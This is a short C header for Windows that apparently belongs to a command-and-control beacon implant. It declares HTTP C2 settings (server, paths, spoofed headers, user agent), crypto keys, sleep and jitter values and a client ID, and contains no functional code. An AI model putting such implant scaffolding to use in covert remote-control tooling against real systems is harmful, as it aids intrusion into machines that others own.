#pragma once
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

const char* metadata_prepend;
const char* metadata_header;
extern const char Http_Post_uri[];
const wchar_t* server;
const wchar_t* get_path;
const wchar_t* post_path;
INTERNET_PORT port;
const wchar_t* host_header;
const wchar_t* user_agent_header;
const wchar_t* server_header;
const const wchar_t* content_type_header;
const char* Http_post_id_prepend;
const char* Http_post_id_append;
const char* Http_post_client_output_prepend;
const char* Http_post_client_output_append;
extern char* pub_key_str;
const char* Response_prepend;
const char* Response_append;
const char IV[];
int SleepTime;
int jitter;
unsigned char aeskey[16];
unsigned char hmackey[16];
int Counter;
int clientID;
